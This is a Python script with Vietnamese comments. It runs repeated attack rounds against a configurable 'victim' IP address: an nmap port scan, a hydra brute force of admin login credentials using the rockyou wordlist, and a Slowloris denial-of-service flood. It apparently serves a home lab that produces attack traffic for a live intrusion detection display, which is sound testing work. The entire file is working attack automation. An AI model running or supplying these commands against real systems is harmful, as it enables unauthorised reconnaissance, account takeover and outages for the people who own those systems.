import subprocess
import time
import os

# CẤU HÌNH ĐỊA CHỈ IP CỦA LAPTOP 2 (MÁY NẠN NHÂN)
VICTIM_IP = "192.168.x.x"  # TODO: Đổi thành IP WiFi thực tế của Laptop 2

def run_command(command, description):
    print(f"\n{'='*50}")
    print(f"[ATTACK] Đang bắt đầu: {description}")
    print(f"Lệnh: {command}")
    print(f"{'='*50}")
    try:
        # Chạy lệnh hệ thống
        process = subprocess.Popen(command, shell=True)
        # Đợi lệnh chạy xong
        process.wait()
    except KeyboardInterrupt:
        print("\n[!] Dừng cuộc tấn công.")
        process.terminate()

def attack_pipeline():
    print("\n[ATTACK] Kích hoạt chế độ Tấn công Liên tục (Live Detection Mode)")
    round_num = 1
    while True:
        print(f"\n{'='*50}")
        print(f"--- BẮT ĐẦU ĐỢT TẤN CÔNG SỐ {round_num} ---")
        print(f"{'='*50}")

        # Bước 1: Port Scan (Quét cổng)
        # BẮT BUỘC DÙNG -sT (TCP Connect) thay vì -sS (SYN Scan) để tránh lỗi rơi gói tin do NAT của Windows 10 WSL
        run_command(f"sudo nmap -sT -T4 -p 1-1000 {VICTIM_IP}", "Quét 1000 cổng đầu tiên bằng chế độ TCP Connect (Nmap)")
        time.sleep(10) # Nghỉ 10s cho GUI hiển thị

        # Bước 2: Brute Force Web
        if os.path.exists("/usr/share/wordlists/rockyou.txt"):
            run_command(f"timeout 30s hydra -l admin -P /usr/share/wordlists/rockyou.txt {VICTIM_IP} http-get /login.php", "Web Brute Force 30s")
        else:
            run_command(f"timeout 30s hydra -l admin -p password123 {VICTIM_IP} http-get /login.php", "Web Brute Force (Mini)")
        time.sleep(10)

        # Bước 3: Tấn công DoS (Slowloris)
        print("\n[ATTACK] Kích hoạt DoS Slowloris. Chạy trong 30 giây...")
        try:
            subprocess.run(f"timeout 30s slowloris {VICTIM_IP} -p 80 -s 200", shell=True)
        except Exception as e:
            pass
        
        print(f"\n--- ĐÃ XONG ĐỢT TẤN CÔNG {round_num}. NGHỈ 20 GIÂY ĐỂ GUI LÀM DỊU... ---")
        time.sleep(20)
        round_num += 1

if __name__ == "__main__":
    if "192.168.x.x" in VICTIM_IP:
        print("[LỖI] Vui lòng chỉnh sửa biến VICTIM_IP thành IP thật của Máy Nạn Nhân.")
        exit(1)
        
    print(f"=== BẮT ĐẦU KỊCH BẢN TẤN CÔNG VÀO {VICTIM_IP} ===")
    attack_pipeline()

